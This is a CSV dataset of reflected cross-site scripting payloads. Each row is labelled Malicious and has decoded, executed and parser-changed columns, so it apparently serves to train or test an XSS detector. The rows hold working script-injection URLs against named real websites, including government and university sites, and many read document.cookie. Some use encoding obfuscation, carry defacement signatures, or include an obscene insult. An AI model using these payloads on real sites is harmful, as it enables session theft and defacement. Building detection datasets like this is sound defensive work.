Payloads,Class,decoded,executed,parser_changed
http://www.sandberg.it/guide/language.aspx?language=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.sandberg.it/guide/language.aspx?language=""><script>alert(""maxwel"")</script>",True,True
http://support.jgaa.com/?cmd=showarticle&amp;id=31}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.sour<br>ce));%3c/script%3e,Malicious,http://support.jgaa.com/?cmd=showarticle&id=31}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,True,True
http://www.eu-service.dk/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious,http://www.eu-service.dk/signinform.php?msg=<script>alert(/xssed/)</script>,True,True
http://www.vcharkarn.com/vblog/?catid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.vcharkarn.com/vblog/?catid=""><script>alert(""maxwel"")</script>",True,True
http://www.investor.reuters.com/404.aspx?nss=%22%3e%3cscript%3ealert(1)%3c/script%3e&amp;aspxerrorpath=%<br>2fgoto.aspx%3fnss%3ddsa&amp;page=pagenotfound,Malicious,"http://www.investor.reuters.com/404.aspx?nss=""><script>alert(1)</script>&aspxerrorpath=/goto.aspx?nss=dsa&page=pagenotfound",True,True
http://www.gnutellaforums.com/getting-started-using-limewire/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.<br>cookie);&lt;/script&gt;,Malicious,"http://www.gnutellaforums.com/getting-started-using-limewire/?threadprefix=""><script>alert(document.cookie);</script>",True,True
http://vankasteren-ict.nl/view_news.php?id=%27%22%28%29%26%251%3cscript%20%3eprompt%28960682%29%3c%2<br>fscript%3e,Malicious,"http://vankasteren-ict.nl/view_news.php?id='""()&%1<script >prompt(960682)</script>",True,True
http://123clasificados.net/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://123clasificados.net/signinform.php?msg=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.ct.gov/dps/guestaccount/login.asp?s=2&amp;msg=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,http://www.ct.gov/dps/guestaccount/login.asp?s=2&msg=<script>alert(document.cookie)</script>,True,True
http://www.konyausd.org.tr/index.php?go=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)%3b%3c/s<br>cript%3e,Malicious,"http://www.konyausd.org.tr/index.php?go=>""><script 
>alert(document.cookie);</script>",True,True
http://downloadoutlet.net/signinform.php?msg=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%<br>53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2<br>c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39<br>%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://downloadoutlet.net/signinform.php?msg="">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
http://www.jplogiq.com/rocher/galeries/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.jplogiq.com/rocher/galeries/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.real.com/realone/trial_terms.html?src=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.real.com/realone/trial_terms.html?src=""><script>alert(document.cookie)</script>",True,True
http://www.fbcpalmdale.org/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.fbcpalmdale.org/guestbook/index.php?lang=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://autoparts.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.cook<br>ie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0,Malicious,http://autoparts.resultspage.com/search?p=q&ts=custom&w=</script><script>alert(document.cookie);</script><script>// &x=0&y=0,True,True
http://hachat.s232.xrea.com/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/sc<br>ript%3e,Malicious,"http://hachat.s232.xrea.com/orz/orz.cgi/-/xssed.com/'>"">'><script>alert(""xss"")</script>",True,True
http://www.adsnl.com/classified-ads-detail.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3<br>c/script%3e,Malicious,"http://www.adsnl.com/classified-ads-detail.php?id='""></title><script>alert(1337)</script>",True,True
http://dnzone.net/search.asp?action=search&amp;searchstring=csharp&quot;&gt;&lt;script&gt;alert(&quot;bluemax&quot;)&lt;/script&gt;,Malicious,"http://dnzone.net/search.asp?action=search&searchstring=csharp""><script>alert(""bluemax"")</script>",True,True
http://tajonline.tolshop.com/v1/indian/catalogue.php?global_search=n&amp;keyword=%22%3e%3cscript%3ealert<br>(%27cueballr%27)%3c/script%3e,Malicious,"http://tajonline.tolshop.com/v1/indian/catalogue.php?global_search=n&keyword=""><script>alert('cueballr')</script>",True,True
http://85.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://85.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
http://www.siirsandigi.com/tumsiirler.asp?tur=5&amp;harf=''&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;,Malicious,http://www.siirsandigi.com/tumsiirler.asp?tur=5&harf=''></script><script>alert(document.cookie)</script>,True,True
http://www.t2000ultra.com/?rid=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b%3c%2fscript%3e,Malicious,"http://www.t2000ultra.com/?rid=""><script>alert(/xss by redtuning/);</script>",True,True
"http://www.saab.bg/test-drajv?form%5bname%5d=111-222-1933email@address.tst&form%5bemail%5d=>""><script%20%0a%0d>alert(/xss%20by%20turkpower/)%3b</script><h1>xss%20by%20turkpower</h1></marquee>",Malicious,"http://www.saab.bg/test-drajv?form[name]=111-222-1933email@address.tst&form[email]=>""><script 
>alert(/xss by turkpower/);</script><h1>xss by turkpower</h1></marquee>",True,True
http://spor.ok.net/sorgula.html?sorgula=true&amp;anahtar='&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;,Malicious,"http://spor.ok.net/sorgula.html?sorgula=true&anahtar='""></title><script>alert(document.cookie)</script>",True,True
http://www.skyrunner.com/search/find.asp?last=&quot;&gt;&lt;script&gt;alert('0ssi3_tr')&lt;/script&gt;,Malicious,"http://www.skyrunner.com/search/find.asp?last=""><script>alert('0ssi3_tr')</script>",True,True
http://www.measurement.gov.au/index.cfm?event=search.showform%27%22%3e%3c/title%3e%3cscript%3ealert(<br>1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.measurement.gov.au/index.cfm?event=search.showform'""></title><script>alert(1337)</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.bannemer.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;bac<br>kdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.bannemer.de/cms/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.itds.gov/xp/cgov/offsiteredirectpg.xml?title=international+trade+%22%3e%3cscript%3ealert%<br>28document.cookie%29%3c/script%3e+system+%28itds%29&amp;url=http%3a%2f%2fwww.itds.gov%2f&amp;referrer=/xp/cg<br>ov/trade/automated/modernization/,Malicious,"http://www.itds.gov/xp/cgov/offsiteredirectpg.xml?title=international trade ""><script>alert(document.cookie)</script> system (itds)&url=http://www.itds.gov/&referrer=/xp/cgov/trade/automated/modernization/",True,True
http://link.members.freewebs.com/members/comments/listpagedcommentsjs.jsp?userid=19405329&amp;limit=20&amp;p<br>agenumber=3&amp;commentsettingid=1053604&amp;callback=%3cscript%3ealert(/xss/)%3c/script%3efw.instances.get(<br>%22myguestbook%22).populatecommentdiv&amp;loadratings=false&amp;ratingcallback=fw.instances.get(%22myguestbo<br>ok%22).instance.parent.getratingcallback&amp;rand=0.590273475706508&amp;repeatlimit=40,Malicious,"http://link.members.freewebs.com/members/comments/listpagedcommentsjs.jsp?userid=19405329&limit=20&pagenumber=3&commentsettingid=1053604&callback=<script>alert(/xss/)</script>fw.instances.get(""myguestbook"").populatecommentdiv&loadratings=false&ratingcallback=fw.instances.get(""myguestbook"").instance.parent.getratingcallback&rand=0.590273475706508&repeatlimit=40",True,True
http://www.maps.ubc.ca/prod/index_detail.php?locat1=408&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.maps.ubc.ca/prod/index_detail.php?locat1=408""><script>alert(document.cookie)</script>",True,True
http://www.meteosuisse.admin.ch/web/fr/rechercher.htm?query=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert<br>(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;x=11&amp;y=11,Malicious,"http://www.meteosuisse.admin.ch/web/fr/rechercher.htm?query='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>&x=11&y=11",True,True
http://www.linuxdevices.com/cgi-bin/search_view.cgi?snews=checked&amp;sarticle=checked&amp;sk=%22%3e%3cscrip<br>t%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;st=all&amp;view=search&amp;ss=newest,Malicious,"http://www.linuxdevices.com/cgi-bin/search_view.cgi?snews=checked&sarticle=checked&sk=""><script>alert('xss')</script>&st=all&view=search&ss=newest",True,True
http://search.epfl.ch/process?lang=fr&amp;searchdomain=directory&amp;query=%22%3e%3c/title%3e%3cscript%3eale<br>rt(%27airroxssed%27)%3b%3c%2fscript%3e,Malicious,"http://search.epfl.ch/process?lang=fr&searchdomain=directory&query=""></title><script>alert('airroxssed');</script>",True,True
http://www2.gep.mtss.gov.pt/docbweb/thres.asp?base=isbd&amp;searchterm=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www2.gep.mtss.gov.pt/docbweb/thres.asp?base=isbd&searchterm=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.samandehi.ir/mainmenunl.html?conversationcontext='&quot;()%26%251&lt;script<br>&gt;alert('xssed')&lt;/script&gt;,Malicious,"http://www.samandehi.ir/mainmenunl.html?conversationcontext='""()&%1<script>alert('xssed')</script>",True,True
http://www.name.com/tools/get_password.php?domain_name=%27%3cscript%3ealert(document.cookie)%3c/scri<br>pt%3eaaa&amp;submit.x=0&amp;submit.y=0,Malicious,http://www.name.com/tools/get_password.php?domain_name='<script>alert(document.cookie)</script>aaa&submit.x=0&submit.y=0,True,True
http://www.best.go.tz/news.asp?letter=%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,http://www.best.go.tz/news.asp?letter=<script>alert(document.cookie)</script>,True,True
http://www.cgcc.gov.cn/news_view.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious,"http://www.cgcc.gov.cn/news_view.php?id=""><script>alert(/ar3sw0rmed/);</script>",True,True
http://search.17173.com/pic.jsp?keyword=&quot;&gt;&lt;font+size=55+color=red&gt;ananizi+siktim&lt;/font&gt;&lt;script&gt;alert<br>(/sikildiniz/)&lt;/script&gt;,Malicious,"http://search.17173.com/pic.jsp?keyword=""><font size=55 color=red>ananizi siktim</font><script>alert(/sikildiniz/)</script>",True,True
http://urlmx.co.cc/index.php/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://urlmx.co.cc/index.php/""><script>alert(1);</script>",True,True
http://alerts.f-prot.com/cgi-bin/alerts_subscribe.pl?name=xss%20here%22%3e%3cscript%3ealert(%22xss%2<br>2)%3c/script%3e%3cx%20&amp;email=&amp;action=confirm&amp;lang=en&amp;step=step_1&amp;next=step_2&amp;submit=%a0%a0%a0%a0subm<br>it%a0%3e%3e%a0%a0%a0,Malicious,"http://alerts.f-prot.com/cgi-bin/alerts_subscribe.pl?name=xss here""><script>alert(""xss"")</script><x &email=&action=confirm&lang=en&step=step_1&next=step_2&submit=����submit�>>���",True,True
http://www.jsecode.com/search.asp?field=title&amp;bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3e<br>&amp;smallclassname=&amp;keyword=xss&amp;submit=%cb%d1%cb%f7,Malicious,"http://www.jsecode.com/search.asp?field=title&bigclassname=<script>alert(""xss"")</script>&smallclassname=&keyword=xss&submit=����",True,True
"<img src=""x:gif"" onerror=""window['al\u0065rt'] (/'renwax23'/)""></img>",Malicious,"<img src=""x:gif"" onerror=""window['al\u0065rt'] (/'renwax23'/)""></img>",True,True
http://www.politikstube.de/forum/vorstellungen/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/s<br>cript&gt;,Malicious,"http://www.politikstube.de/forum/vorstellungen/?thredprefix=""></a><script>alert(document.cookie);</script>",True,True
http://www.mymojo.com.au/member/profile.php?profile_id=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.mymojo.com.au/member/profile.php?profile_id=""><script>alert(""backdoor"")</script>",True,True
http://www.theroyalmafia.com/signup.php?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://www.theroyalmafia.com/signup.php?ref=""></a><script>alert(1);</script>",True,True
http://de.888.com/site2/backgammon/default.htm?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://de.888.com/site2/backgammon/default.htm?lang=""><script>alert(document.cookie)</script>",True,True
http://lotgd.net/create.php?c=1-132423&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://lotgd.net/create.php?c=1-132423""><script>alert(document.cookie);</script>",True,True
http://www.wosa.co.za/calendar_view.php?id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.wosa.co.za/calendar_view.php?id=""><script>alert(document.cookie)</script>",True,True
http://www.afec-en-ligne.org/spip.php?action=cookie&amp;url=java:%22/%3cscript%3ealert('hello%20the%20ra<br>t')%3c/script%3e,Malicious,"http://www.afec-en-ligne.org/spip.php?action=cookie&url=java:""/<script>alert('hello the rat')</script>",True,True
http://www.microsofttraining.com/content/secure/login.asp?ccpsubsiteid=0&amp;vdid=0&amp;hdnprivateeventid=&amp;p<br>reregistrationid=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious,"http://www.microsofttraining.com/content/secure/login.asp?ccpsubsiteid=0&vdid=0&hdnprivateeventid=&preregistrationid=""><script>alert(document.cookie);</script>",True,True
http://www.4x4mayhem.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,http://www.4x4mayhem.com/register.php?ref='><script>alert(document.cookie);</script>,True,True
http://www.jwatch.org/cgi/sectionsearch?jc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.jwatch.org/cgi/sectionsearch?jc=""><script>alert(""maxwel"")</script>",True,True
http://ramazan.milliyet.com.tr/imsakiye.asp?sehir=%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious,"http://ramazan.milliyet.com.tr/imsakiye.asp?sehir=""><script>alert(""xss"")</script>",True,True
http://ttongfly.net/bbs/view.php?id=free&amp;keyword=%c2%bc%c3%9b%c2%bd%c3%83&amp;no=1006&amp;sc=on&amp;sn=on&amp;ss=on%<br>22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%4<br>3%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39<br>%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%<br>69%70%74%3e%0a,Malicious,"http://ttongfly.net/bbs/view.php?id=free&keyword=¼Û½Ã&no=1006&sc=on&sn=on&ss=on"">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
http://www.mnttoppa.com/pages.asp?kw=%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious,"http://www.mnttoppa.com/pages.asp?kw=><script>alert(""xss"")</script>",True,True
http://www.armadatekno.com/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.armadatekno.com/default.asp?gb=urun&id=293&ortak=""><script>alert(""backdoor"")</script>",True,True
http://classic.prizee.com/inscription.php?gid=53&amp;idt=32&amp;utm_campaign=%22%3e%3cscript%3ealert%281337%<br>29%3c/script%3e%3ch1%3eallez%20vous%20faire%20avec%20vos%20adsense%3c/h1%3e&amp;utm_source=adsmarket3912<br>&amp;utm_medium=affiliation&amp;ce_cid=001ukh0000001wa.ke6gwpr8lt000000,Malicious,"http://classic.prizee.com/inscription.php?gid=53&idt=32&utm_campaign=""><script>alert(1337)</script><h1>allez vous faire avec vos adsense</h1>&utm_source=adsmarket3912&utm_medium=affiliation&ce_cid=001ukh0000001wa.ke6gwpr8lt000000",True,True
http://lifehacker.com/search/anythingyouwant/bydate/?q=%22%3e%3cscript%3ealert(1)%3c/script%3e&amp;x=46&amp;<br>y=8,Malicious,"http://lifehacker.com/search/anythingyouwant/bydate/?q=""><script>alert(1)</script>&x=46&y=8",True,True
http://www.solarliving.org/display.asp?catid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.solarliving.org/display.asp?catid=""><script>alert(""maxwel"")</script>",True,True
http://communityband.org/phpinfo.php?a[]=&gt;&lt;script&gt;alert(/kabus-kabustr.com/);&lt;/script&gt;,Malicious,http://communityband.org/phpinfo.php?a[]=><script>alert(/kabus-kabustr.com/);</script>,True,True
http://www.alwan.co.il/search.php?q=%3cscript%3ealert(document.cookie)%3c/script%3e=local&amp;page=7,Malicious,http://www.alwan.co.il/search.php?q=<script>alert(document.cookie)</script>=local&page=7,True,True
http://www.letemps.ch/template/static.asp?cont=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.letemps.ch/template/static.asp?cont=""><script>alert(""maxwel"")</script>",True,True
http://www.mtv.com/community/profiles/profile_not_found.jhtml?username=&quot;&gt;&lt;script&gt;alert('x')&lt;/script&gt;,Malicious,"http://www.mtv.com/community/profiles/profile_not_found.jhtml?username=""><script>alert('x')</script>",True,True
http://kennysclub.com/search.php?min_cur=&amp;mode=advanced&amp;max_cur=&amp;seller=include&amp;seller_name=&quot;&gt;&lt;scrip<br>t&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://kennysclub.com/search.php?min_cur=&mode=advanced&max_cur=&seller=include&seller_name=""><script>alert(document.cookie)</script>",True,True
http://www.hairstylesdesign.net/result.asp?q=vital%22%3e%3cscript%3ealert('the_miller')%3c/script%3e<br>&amp;submit=search&amp;url=http://vital.h.com.,Malicious,"http://www.hairstylesdesign.net/result.asp?q=vital""><script>alert('the_miller')</script>&submit=search&url=http://vital.h.com.",True,True
http://www.targus.com/us/categorysearch.asp?searchedterms=&quot;&gt;&lt;script&gt;alert(/=xssbydt=/)&lt;/script&gt;,Malicious,"http://www.targus.com/us/categorysearch.asp?searchedterms=""><script>alert(/=xssbydt=/)</script>",True,True
"http://www.rockstargames.com/<script>alert(""xss by timse"")</script>",Malicious,"http://www.rockstargames.com/<script>alert(""xss by timse"")</script>",True,True
http://danno005.u.la/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.com%<br>22)%3c/script%3e,Malicious,"http://danno005.u.la/orz.cgi/-/xssed.com/'>"">'><script>alert(""xss by kusomiso.com"")</script>",True,True
http://83.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://83.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
http://www.autoresurs.cz/cgi-bin/conf/post/new.pl?conf=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.autoresurs.cz/cgi-bin/conf/post/new.pl?conf=""><script>alert(""maxwel"")</script>",True,True
http://www.luberon-ventoux.com/index.php?lang=fr/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious,"http://www.luberon-ventoux.com/index.php?lang=fr/""><script>alert('xss by atm0n3r')</script>",True,True
http://www.houra.fr/index.php?a=valid&amp;destination=%22%3e%3cscript%3ealert(document.cookie)%3c/script<br>%3e,Malicious,"http://www.houra.fr/index.php?a=valid&destination=""><script>alert(document.cookie)</script>",True,True
http://www.concordialutheran.net/gallery/login.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.concordialutheran.net/gallery/login.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://xssdb.dabbledb.com/publish/attackdb/x&lt;br&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;xx/xssdb.html,Malicious,http://xssdb.dabbledb.com/publish/attackdb/x<br><script>alert(/xss/);</script>xx/xssdb.html,True,True
https://www.proton.gr/search/index.php?sid=61f882a8fc8dd3e8e175a416b0fb0afa&amp;qu=%22%3e%3cimg%20src=k%<br>20onerror=alert(/xss/)%20/%3e%3ciframe%20src=%22http://www.xssed.com%22%3e,Malicious,"https://www.proton.gr/search/index.php?sid=61f882a8fc8dd3e8e175a416b0fb0afa&qu=""><img src=k onerror=alert(/xss/) /><iframe src=""http://www.xssed.com"">",True,True
http://boonty.tf1.fr/download.php?intidgame=167016%27%27%22%3e%3cmarquee%3e%3cimg%20src=k.png%20oner<br>ror=alert(/xss/.source)%20/%3e,Malicious,"http://boonty.tf1.fr/download.php?intidgame=167016''""><marquee><img src=k.png onerror=alert(/xss/.source) />",True,True
http://www.vodpornos.com/index.php?event=showmovielist&amp;search%3aq=%22%3e%3cscript%3ealert(1)%3c%2fsc<br>ript%3e&amp;search%3asearch=go&amp;search%3amethod=titlesearch,Malicious,"http://www.vodpornos.com/index.php?event=showmovielist&search:q=""><script>alert(1)</script>&search:search=go&search:method=titlesearch",True,True
http://www.fdp-main-tauber.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.fdp-main-tauber.de/cms/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.microsoft-press.de/catalog.asp?cnt=catalog&amp;cat0=21&amp;idx0=3&amp;lng=&quot;&gt;&lt;script&gt;alert('trex')&lt;/sc<br>ript&gt;&lt;h1&gt;turkhackeriz.com&lt;/h1&gt;,Malicious,"http://www.microsoft-press.de/catalog.asp?cnt=catalog&cat0=21&idx0=3&lng=""><script>alert('trex')</script><h1>turkhackeriz.com</h1>",True,True
http://sv.888.com/site2/poker/default.htm?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://sv.888.com/site2/poker/default.htm?lang=""><script>alert(document.cookie)</script>",True,True
http://www.radiohaus.com.br/busca.php?cat=0&amp;keyword=%3cscript%3ealert%28%22fzero+rules+%3b%29%22%29%<br>3c%2fscript%3e,Malicious,"http://www.radiohaus.com.br/busca.php?cat=0&keyword=<script>alert(""fzero rules ;)"")</script>",True,True
http://www.alpharetta-ga.gov/index.php?m=articles&amp;id=580&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.alpharetta-ga.gov/index.php?m=articles&id=580""><script>alert(document.cookie)</script>",True,True
http://www.glidenumber.net/glide/public/search/search.jsp?level0=*&amp;level1=*&amp;events=*&amp;keywords=%27%22<br>%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh<br>1%3e%3c%2fmarquee%3e&amp;ftoption=%26&amp;fromyear=&amp;frommonth=&amp;fromday=&amp;toyear=&amp;tomonth=&amp;today=&amp;maxhits=10&amp;s<br>ortby=0&amp;go.x=16&amp;go.y=13&amp;nstart=0&amp;posted=0&amp;process=0&amp;x_resolution=1024,Malicious,"http://www.glidenumber.net/glide/public/search/search.jsp?level0=*&level1=*&events=*&keywords='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>&ftoption=&&fromyear=&frommonth=&fromday=&toyear=&tomonth=&today=&maxhits=10&sortby=0&go.x=16&go.y=13&nstart=0&posted=0&process=0&x_resolution=1024",True,True
http://s2.asmandez.ir/login.php/%22%3e%3cscript%3ealert%28/securitylab.ir/%29%3c/script%3e,Malicious,"http://s2.asmandez.ir/login.php/""><script>alert(/securitylab.ir/)</script>",True,True
http://www.beyazonline.com/videolargoster.asp?no=1&amp;baslik=&lt;script&gt;alert(&quot;scriptorium(turkey)%20hackh<br>aber.com&quot;)&lt;/script&gt;,Malicious,"http://www.beyazonline.com/videolargoster.asp?no=1&baslik=<script>alert(""scriptorium(turkey) hackhaber.com"")</script>",True,True
http://www.contractedassassin.com/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,http://www.contractedassassin.com/register.php?ref=1'><script>alert(document.cookie);</script>,True,True
http://www.eera.gov.uk/search.asp?err=2&amp;search=&quot;&gt;&lt;script&gt;alert(&quot;darktoxic&quot;)&lt;/script&gt;,Malicious,"http://www.eera.gov.uk/search.asp?err=2&search=""><script>alert(""darktoxic"")</script>",True,True
http://www.mef.gov.kh/test.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://www.mef.gov.kh/test.php?a[]=""><script>alert(document.cookie)</script>",True,True
http://demo.doubleclick.com/generators/gen_302asp.asp?jumpto=&lt;/textarea&gt;&lt;script&gt;alert(/xss/)&lt;/script<br>&gt;,Malicious,http://demo.doubleclick.com/generators/gen_302asp.asp?jumpto=</textarea><script>alert(/xss/)</script>,True,True
http://www.comm.ecowas.int/sec/index.php?id=treaty&amp;lang=en%22%3e%3cscript%3ealert%28document.cookie%<br>29%3c/script%3e,Malicious,"http://www.comm.ecowas.int/sec/index.php?id=treaty&lang=en""><script>alert(document.cookie)</script>",True,True
